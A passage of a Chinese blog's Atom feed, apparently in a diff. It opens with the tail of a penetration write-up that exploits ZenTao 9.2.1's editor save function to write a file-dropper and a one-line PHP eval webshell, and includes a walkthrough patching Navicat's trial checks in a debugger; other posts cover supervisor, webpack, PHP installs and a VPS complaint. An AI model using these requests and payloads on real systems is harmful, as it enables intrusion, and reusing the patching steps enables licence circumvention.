class="string">'s h e l l _ e x e c'</span>, <span class="string">'s y s t e m'</span>, <span class="string">'$ $'</span>, <span class="string">'i n c l u d e'</span>, <span class="string">'r e q u i r e'</span>, <span class="string">'a s s e r t'</span>);</span><br><span class="line">    $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent);</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent);</span><br><span class="line"></span><br><span class="line">    $dirPath = dirname($filePath);</span><br><span class="line">    $extFilePath = substr($filePath, <span class="number">0</span>, strpos($filePath, DS . <span class="string">'ext'</span> . DS) + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(!is_dir($dirPath) <span class="keyword">and</span> is_writable($extFilePath)) mkdir($dirPath, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span>(is_writable($dirPath))</span><br><span class="line">    &#123;</span><br><span class="line">        file_put_contents($filePath, $fileContent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(js::alert(<span class="keyword">$this</span>-&gt;lang-&gt;editor-&gt;notWritable . $extFilePath));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现写入文件路径也可以控制.</p><p>随便访问个URL让他弹出错误信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: the control file /opt/zbox/app/zentao/module/indaafasf/control.php not found. in /opt/zbox/app/zentao/framework/base/router.class.php on line 1238, last called by /opt/zbox/app/zentao/framework/base/router.class.php on line 1357 through function setControlFile.</span><br><span class="line">in /opt/zbox/app/zentao/framework/base/router.class.php on line 1932 when visiting indaafasf</span><br></pre></td></tr></table></figure><p>发现禅道路径在 /opt/zbox/app/zentao/</p><p>查看源码得知 www 目录为可直接访问目录</p><p>直接上传文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL:http://127.0.0.1/?m=api&amp;f=getModel&amp;moduleName=editor&amp;methodName=save&amp;params=filePath=/opt/zbox/app/zentao/www/aaaaaa.php</span><br><span class="line">Method:POST</span><br><span class="line">Payload:fileContent=&lt;?php file_put_contents($_POST[1],$_POST[2]);</span><br></pre></td></tr></table></figure></p><p>访问上传后的文件 跳过检测上传一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL:http://127.0.0.1/aaaaaa.php</span><br><span class="line">Method:POST</span><br><span class="line">Payload:</span><br><span class="line">1=/opt/zbox/app/zentao/www/b.php</span><br><span class="line">2=&lt;?php @eval($_POST[&apos;pass&apos;]);?&gt;</span><br></pre></td></tr></table></figure><p>最后上一张菜刀图<br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/zentao_webshell/result.png" alt title>                </div>                <div class="image-caption"></div>            </figure></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这种上传文件的地方已经要做好路径/文件后缀名的限制. 可以上传的目录一定不要给PHP的权限.</p><h1 id="蛋疼"><a href="#蛋疼" class="headerlink" title="蛋疼"></a>蛋疼</h1><p>最后拿到了数据库发现管理员的密码竟然是默认密码…白忙活了这么多</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;有登陆权限,对 9.2.1 版本禅道渗透,获取webshell&lt;br&gt;
+    
+    </summary>
+    
+      <category term="安全" scheme="https://hooklife.me/categories/%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="渗透" scheme="https://hooklife.me/tags/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="webshell" scheme="https://hooklife.me/tags/webshell/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ubuntu中使用webpack,部分文件不能自动reload的解决方法</title>
+    <link href="https://hooklife.me/%E5%89%8D%E7%AB%AF/ubuntu%E4%B8%AD%E4%BD%BF%E7%94%A8webpack,%E9%83%A8%E5%88%86%E6%96%87%E4%BB%B6%E4%B8%8D%E8%83%BD%E8%87%AA%E5%8A%A8reload%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
+    <id>https://hooklife.me/前端/ubuntu中使用webpack,部分文件不能自动reload的解决方法/</id>
+    <published>2017-12-21T09:10:00.000Z</published>
+    <updated>2020-04-14T03:59:02.086Z</updated>
+    
+    <content type="html"><![CDATA[<p>在webstrome中开发,发现大部分文件是可以自动reload的,但是部分文件不能自动进行reload</p><a id="more"></a><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>命令行中执行命令</p><p>在你的系统中修改足够的 inotify watches,让webpack能正常监控文件变化 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf &amp;&amp; sudo sysctl -p</span><br></pre></td></tr></table></figure><p>参考资料</p><p><a href="https://stackoverflow.com/questions/26708205/webpack-watch-isnt-compiling-changed-files" target="_blank" rel="noopener">https://stackoverflow.com/questions/26708205/webpack-watch-isnt-compiling-changed-files</a></p><p><a href="https://webpack.github.io/docs/troubleshooting.html" target="_blank" rel="noopener">https://webpack.github.io/docs/troubleshooting.html</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在webstrome中开发,发现大部分文件是可以自动reload的,但是部分文件不能自动进行reload&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="前端" scheme="https://hooklife.me/categories/%E5%89%8D%E7%AB%AF/"/>
+    
+    
+      <category term="ubuntu" scheme="https://hooklife.me/tags/ubuntu/"/>
+    
+      <category term="webpack" scheme="https://hooklife.me/tags/webpack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>supervisor在deepin安装、使用与卸载</title>
+    <link href="https://hooklife.me/linux/Supervisor%E5%9C%A8deepin%E5%AE%89%E8%A3%85%E3%80%81%E5%8D%B8%E8%BD%BD%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
+    <id>https://hooklife.me/linux/Supervisor在deepin安装、卸载与使用/</id>
+    <published>2017-11-14T03:00:00.000Z</published>
+    <updated>2020-04-14T03:59:02.085Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Supervisor是一个python开发的进程管理工具，你可以使用它对  UNIX-like 操作系统的多个进程进行控制和监控。</p><a id="more"></a><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install supervisor</span><br></pre></td></tr></table></figure><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="1-配置"><a href="#1-配置" class="headerlink" title="1.配置"></a>1.配置</h2><p>创建一个配置文件在/etc/supervisor/conf.d 目录下，文件命名必须以.conf结尾。例如: idea-worker.conf<br>内容大致如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[program:idea-worker]</span><br><span class="line">command=/root/IntelliJIDEALicenseServer_linux_amd64 //启动命令</span><br><span class="line">autostart=true // 在 supervisord 启动的时候也自动启动，如果设置为false 重启服务器后还需要手动执行命令进行运行</span><br><span class="line">autorestart=true // 程序异常退出后自动重启 设置为false supervisord 将不会在程序关闭后重新运行、设置</span><br><span class="line">stderr_logfile=/var/log/idea-worker.err.log // 错误日志</span><br><span class="line">stdout_logfile=/var/log/idea-worker.out.log // 所有日志</span><br></pre></td></tr></table></figure></p><p><strong>autostart</strong><br> 在 supervisord 启动的时候也自动启动<br> false：重启服务器后还需要手动执行命令进行运行<br> true： 重启服务器后自动运行</p><p><strong>autorestart</strong><br>程序异常退出后自动重启<br>false：supervisord 将不会在程序关闭后重新运行<br>true：supervisord 将会在程序关闭后重新运行<br>unexpected：supervisord 将在程序报异常的时候进行重启</p><p><strong>stderr_logfile、stdout_logfile</strong><br>主要定义程序运行日志位置，指定的目录必须在启动程序前存在，supervisord不会创建目录，只会创建对应的文件</p><p>文档列出很多可以进行配置的选项，可以查阅官方手册 <a href="http://supervisord.org/configuration.html#program-x-section-settings" target="_blank" rel="noopener">configuration</a></p><h2 id="2-reload并应用配置"><a href="#2-reload并应用配置" class="headerlink" title="2.reload并应用配置"></a>2.reload并应用配置</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl reread</span><br><span class="line">supervisorctl update</span><br></pre></td></tr></table></figure><h2 id="3-管理程序"><a href="#3-管理程序" class="headerlink" title="3.管理程序"></a>3.管理程序</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl</span><br></pre></td></tr></table></figure><p>执行后进入supervisorctl界面，就可以对程序进行执行任务了<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start idea-worker</span><br><span class="line">stop idea-worker</span><br><span class="line">restart idea-worker</span><br><span class="line">status</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></p><h2 id="4-使用web界面管理程序"><a href="#4-使用web界面管理程序" class="headerlink" title="4.使用web界面管理程序"></a>4.使用web界面管理程序</h2><p>supervisor 提供了通过浏览器来管理程序的方法。<br>开启方法：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/supervisor/supervisord.conf</span><br></pre></td></tr></table></figure></p><p>添加这几行文字，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[inet_http_server]         ; inet (TCP) server disabled by default</span><br><span class="line">port=0.0.0.0:9001          ; (ip_address:port specifier, *:port for ;all iface)</span><br><span class="line">username=user              ; (default is no username (open server))</span><br><span class="line">password=123               ; (default is no password (open server))</span><br></pre></td></tr></table></figure></p><p>打开 <a href="http://ip:9001" target="_blank" rel="noopener">http://ip:9001</a>  输入用户名密码，即可进入程序管理web界面<br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/supervistor_deepin_install/web_ui.png" alt="webui" title>                </div>                <div class="image-caption">webui</div>            </figure></p><p><strong>默认外网可以进行访问，请自行修改账号密码</strong></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料:"></a>参考资料:</h3><ul><li><a href="https://www.digitalocean.com/community/tutorials/how-to-install-and-manage-supervisor-on-ubuntu-and-debian-vps" target="_blank" rel="noopener">How To Install and Manage Supervisor on Ubuntu and Debian VPS</a></li><li><a href="http://liyangliang.me/posts/2015/06/using-supervisor/" target="_blank" rel="noopener">使用 supervisor 管理进程</a></li><li><a href="https://laravel-china.org/topics/2126/supervisor-installation-configuration-use" target="_blank" rel="noopener">supervisor 安装配置使用</a></li></ul><h1 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt purge supervisor</span><br></pre></td></tr></table></figure><p>执行命令后</p><p>supervisor 正常被卸载<br>supervisord 并没有被正常卸载</p><p>输入supervisord 命令后报错<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"/usr/local/bin/supervisord"</span>, line <span class="number">6</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> pkg_resources <span class="keyword">import</span> load_entry_point</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py"</span>, line <span class="number">3019</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"><span class="meta">    @_call_aside</span></span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py"</span>, line <span class="number">3003</span>, <span class="keyword">in</span> _call_aside</span><br><span class="line">    f(*args, **kwargs)</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py"</span>, line <span class="number">3032</span>, <span class="keyword">in</span> _initialize_master_working_set</span><br><span class="line">    working_set = WorkingSet._build_master()</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py"</span>, line <span class="number">655</span>, <span class="keyword">in</span> _build_master</span><br><span class="line">    ws.require(__requires__)</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py"</span>, line <span class="number">963</span>, <span class="keyword">in</span> require</span><br><span class="line">    needed = self.resolve(parse_requirements(requirements))</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/dist-packages/pkg_resources/__init__.py"</span>, line <span class="number">849</span>, <span class="keyword">in</span> resolve</span><br><span class="line">    <span class="keyword">raise</span> DistributionNotFound(req, requirers)</span><br><span class="line">pkg_resources.DistributionNotFound: The <span class="string">'supervisor==3.2.0'</span> distribution was <span class="keyword">not</span> found <span class="keyword">and</span> <span class="keyword">is</span> required by the application</span><br></pre></td></tr></table></figure></p><p>执行<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis supervisord</span><br></pre></td></tr></table></figure></p><p>查找supervisord在哪<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@jdu4e00u53f7:~# whereis supervisord</span><br><span class="line">supervisord: /usr/local/bin/supervisord</span><br></pre></td></tr></table></figure></p><p>执行<br><code>rm -rf /usr/local/bin/supervisord</code>卸载成功</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Supervisor是一个python开发的进程管理工具，你可以使用它对  UNIX-like 操作系统的多个进程进行控制和监控。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="linux" scheme="https://hooklife.me/categories/linux/"/>
+    
+    
+      <category term="supervisor" scheme="https://hooklife.me/tags/supervisor/"/>
+    
+      <category term="ubuntu" scheme="https://hooklife.me/tags/ubuntu/"/>
+    
+      <category term="deepin" scheme="https://hooklife.me/tags/deepin/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>记一次Navicat的爆破</title>
+    <link href="https://hooklife.me/%E9%80%86%E5%90%91/Navicat%E7%9A%84%E7%88%86%E7%A0%B4/"/>
+    <id>https://hooklife.me/逆向/Navicat的爆破/</id>
+    <published>2016-12-26T06:17:00.000Z</published>
+    <updated>2020-04-14T03:59:02.085Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近公司电脑的Navicat试用期过了，想找找其他Mysql管理的GUI，用了几款都不太好用，直接下载破解版的Navicat又感觉不是很舒服，总是感觉下载的破解版不是很干净。（对，我就是这么矫情）</p><p>那就只好动手了，下面记录了破解的过程与思路。</p><p><strong>大家有经济实力的情况下还是要尽力的支持正版的，以下过程只做技术分享，切勿用于非法用途</strong></p><a id="more"></a><hr><h2 id="破解过程"><a href="#破解过程" class="headerlink" title="破解过程"></a>破解过程</h2><p>载入到OD后运行，CTRL+G 输入 00401000 到达程序领空。</p><p>右键搜索字符串后搜索关键词“评估”，到达疑似程序弹出注册框的位置</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/crack_navicat/20161229151447.jpg" alt="20161229151447" title>                </div>                <div class="image-caption">20161229151447</div>            </figure><p>到达段首（push ebp的位置），F2下断点，CTRL+F2重新运行程序</p><p>断下后我们F8向下跟，跟到这个位置后<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/crack_navicat/20161229152103.jpg" alt="20161229152103" title>                </div>                <div class="image-caption">20161229152103</div>            </figure></p><p>可以看到这有个jnz是比较关键的，如果这个JNZ不跳的话，应该就会直接弹出试用过期的框，</p><p>那我们直接把jnz改成je跳过弹出注册框的部分，当然还没结束，事情没这么简单，我们发现改成je后运行Navicat直接闪退掉了，说明后面还是有相关的验证的。</p><p>那好吧，重新运行起来，把谈注册框的位置改成je后我们继续往下面跟</p><p>到达这个位置后<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/crack_navicat/20161229152819.jpg" alt="20161229152819" title>                </div>                <div class="image-caption">20161229152819</div>            </figure></p><p>发现了这个字符串，应该就是Navicat的主体窗口了，我们就想办法让他运行到这</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/crack_navicat/20161229152953.jpg" alt="20161229152953" title>                </div>                <div class="image-caption">20161229152953</div>            </figure><p>到这步后，如果jnb跳转不成立的话，就会走到jmp处，然后就会跳过TNavicatMainForm 这个位置，显然是不行的，我们只好吧jnb改成jmp让他跳过这个jmp<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/crack_navicat/20161229153204.jpg" alt="20161229153204" title>                </div>                <div class="image-caption">20161229153204</div>            </figure></p><p>当走到这个call的位置的时候，我们发现任务栏的navicat已经变成两个了（应该是一个是启动界面，一个已经进入了主界面）也基本证明了猜想这部分就是在创建navicat的主窗口。然而我们直接运行起来，发现navitcat还是会闪退，那就说明这个位置之后还是有验证，那就只好继续跟了。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/crack_navicat/20161229153421.jpg" alt="20161229153421" title>                </div>                <div class="image-caption">20161229153421</div>            </figure><p>再跟不远之后就发现了关键的退出call(f8到这个call的位置时，进程停止)，发现上面有个je 改成jmp 运行。</p><p><img src="/img/crack_navicat/20161229153602.jpg" alt="20161229153602">好了运行成功了，试了下功能 基本都是好使的。到此就破解完成了</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近公司电脑的Navicat试用期过了，想找找其他Mysql管理的GUI，用了几款都不太好用，直接下载破解版的Navicat又感觉不是很舒服，总是感觉下载的破解版不是很干净。（对，我就是这么矫情）&lt;/p&gt;
+&lt;p&gt;那就只好动手了，下面记录了破解的过程与思路。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;大家有经济实力的情况下还是要尽力的支持正版的，以下过程只做技术分享，切勿用于非法用途&lt;/strong&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="逆向" scheme="https://hooklife.me/categories/%E9%80%86%E5%90%91/"/>
+    
+    
+      <category term="爆破" scheme="https://hooklife.me/tags/%E7%88%86%E7%A0%B4/"/>
+    
+      <category term="逆向" scheme="https://hooklife.me/tags/%E9%80%86%E5%90%91/"/>
+    
+      <category term="navicat" scheme="https://hooklife.me/tags/navicat/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>linux给指定用户生成sshkey</title>
+    <link href="https://hooklife.me/linux/linux%E7%BB%99%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E7%94%9F%E6%88%90sshkey/"/>
+    <id>https://hooklife.me/linux/linux给指定用户生成sshkey/</id>
+    <published>2016-10-30T16:00:00.000Z</published>
+    <updated>2020-04-14T03:59:02.086Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u apache ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>参考资料:<a href="https://stackoverflow.com/questions/7306990/generating-ssh-keys-for-apache-user" target="_blank" rel="noopener">https://stackoverflow.com/questions/7306990/generating-ssh-keys-for-apache-user</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
+      
+    
+    </summary>
+    
+      <category term="linux" scheme="https://hooklife.me/categories/linux/"/>
+    
+    
+      <category term="ssh" scheme="https://hooklife.me/tags/ssh/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>webpack+vue单个components引用单独的css文件</title>
+    <link href="https://hooklife.me/%E5%89%8D%E7%AB%AF/webpack+vue%E5%8D%95%E4%B8%AAcomponents%E5%BC%95%E7%94%A8%E5%8D%95%E7%8B%AC%E7%9A%84css%E6%96%87%E4%BB%B6/"/>
+    <id>https://hooklife.me/前端/webpack+vue单个components引用单独的css文件/</id>
+    <published>2016-10-21T09:10:00.000Z</published>
+    <updated>2020-04-14T03:59:02.086Z</updated>
+    
+    <content type="html"><![CDATA[<p>因为多个componets中css定义有冲突</p><p>所以每个componets必须要单独加载他自己的css<br><a id="more"></a></p><p>直接 improt 的话 webpack 就会把所有的css样式生成一个大的css，由于当初编写css命名不是很好，很多classname都是重复的，然后页面就会各种错乱。</p><p>找了半天也没找到compoents 动态加载css的方法</p><p>但是找到了一个算是比较好的办法</p><p>在componets 中 使用这种形式去引用css</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style scoped src="xxx.css"&gt;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>webpack打包的时候会在 css 中自动加上当前components的前缀 就能完美解决各个components css冲突的问题啦</p><p>参考资料（我本人的提问）：</p><p><a href="https://segmentfault.com/q/1010000007093036" target="_blank" rel="noopener">https://segmentfault.com/q/1010000007093036</a></p><p><a href="https://www.v2ex.com/t/311109" target="_blank" rel="noopener">https://www.v2ex.com/t/311109</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;因为多个componets中css定义有冲突&lt;/p&gt;
+&lt;p&gt;所以每个componets必须要单独加载他自己的css&lt;br&gt;
+    
+    </summary>
+    
+      <category term="前端" scheme="https://hooklife.me/categories/%E5%89%8D%E7%AB%AF/"/>
+    
+    
+      <category term="webpack" scheme="https://hooklife.me/tags/webpack/"/>
+    
+      <category term="vue" scheme="https://hooklife.me/tags/vue/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ubuntu 上安装/卸载php7</title>
+    <link href="https://hooklife.me/linux/ubuntu%20%E4%B8%8A%E5%AE%89%E8%A3%85%E5%8D%B8%E8%BD%BDphp7/"/>
+    <id>https://hooklife.me/linux/ubuntu 上安装卸载php7/</id>
+    <published>2016-10-17T09:29:00.000Z</published>
+    <updated>2020-04-14T03:59:02.086Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="添加PHP源"><a href="#添加PHP源" class="headerlink" title="添加PHP源"></a>添加PHP源</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-software-properties software-properties-common</span><br><span class="line">sudo LC_ALL=C.UTF-8 add-apt-repository ppa:ondrej/php</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><h2 id="安装PHP7和常用扩展"><a href="#安装PHP7和常用扩展" class="headerlink" title="安装PHP7和常用扩展"></a>安装PHP7和常用扩展</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php7.0 php7.0-fpm php7.0-mysql -y</span><br></pre></td></tr></table></figure><h2 id="卸载php7"><a href="#卸载php7" class="headerlink" title="卸载php7"></a>卸载php7</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get purge php7.0-common</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;添加PHP源&quot;&gt;&lt;a href=&quot;#添加PHP源&quot; class=&quot;headerlink&quot; title=&quot;添加PHP源&quot;&gt;&lt;/a&gt;添加PHP源&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
+      
+    
+    </summary>
+    
+      <category term="linux" scheme="https://hooklife.me/categories/linux/"/>
+    
+    
+      <category term="ubuntu" scheme="https://hooklife.me/tags/ubuntu/"/>
+    
+      <category term="php" scheme="https://hooklife.me/tags/php/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>一个垃圾的VPS提供商枫叶主机</title>
+    <link href="https://hooklife.me/%E6%9D%82%E4%B9%B1/%E4%B8%80%E4%B8%AA%E5%9E%83%E5%9C%BE%E7%9A%84VPS%E6%8F%90%E4%BE%9B%E5%95%86%E6%9E%AB%E5%8F%B6%E4%B8%BB%E6%9C%BA/"/>
+    <id>https://hooklife.me/杂乱/一个垃圾的VPS提供商枫叶主机/</id>
+    <published>2016-05-05T14:29:12.000Z</published>
+    <updated>2020-04-14T03:59:02.086Z</updated>
+    
+    <content type="html"><![CDATA[<p>对原来的vps不是很满意 就换了个vps<br>找到一个以前经常在v2ex宣传的 枫叶vps <a href="http://www.fyvps.com" target="_blank" rel="noopener">http://www.fyvps.com</a> </p><p>买了一个vps  整体体验也就一般般  经常丢包 但是影响也不是很大<br>我觉得还行 就把老的服务器上的东西都迁移了过去,没想到…<br>到期之钱没有任何邮件/电话通知 直接就不能续费了  并且里面的数据也都全部找不回来了</p><p>在群里跟他们沟通一下 他们让我提交工单 我也提交了一下<br>然后说一会儿会有人联系我 最后把我从群里 T 了出去 </p><a id="more"></a><p>联系他们客服 他们客服的态度<br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fy1.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><br>然后他们的客服联系我<br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fy2.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/fy3.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure></p><p>数据最后也没能找回来<br>以前写的那么多博文都消失了<br>开始想通过 google的cache找回来<br>后来想想算了 就当一个暂新的开始把</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;对原来的vps不是很满意 就换了个vps&lt;br&gt;找到一个以前经常在v2ex宣传的 枫叶vps &lt;a href=&quot;http://www.fyvps.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.fyvps.com&lt;/a&gt; &lt;/p&gt;
+&lt;p&gt;买了一个vps  整体体验也就一般般  经常丢包 但是影响也不是很大&lt;br&gt;我觉得还行 就把老的服务器上的东西都迁移了过去,没想到…&lt;br&gt;到期之钱没有任何邮件/电话通知 直接就不能续费了  并且里面的数据也都全部找不回来了&lt;/p&gt;
+&lt;p&gt;在群里跟他们沟通一下 他们让我提交工单 我也提交了一下&lt;br&gt;然后说一会儿会有人联系我 最后把我从群里 T 了出去 &lt;/p&gt;
+    
+    </summary>
+    
+      <category term="杂乱" scheme="https://hooklife.me/categories/%E6%9D%82%E4%B9%B1/"/>
+    
+    
+      <category term="vps" scheme="https://hooklife.me/tags/vps/"/>
+    
+      <category term="云主机" scheme="https://hooklife.me/tags/%E4%BA%91%E4%B8%BB%E6%9C%BA/"/>
+    
+  </entry>
+  
+</feed>
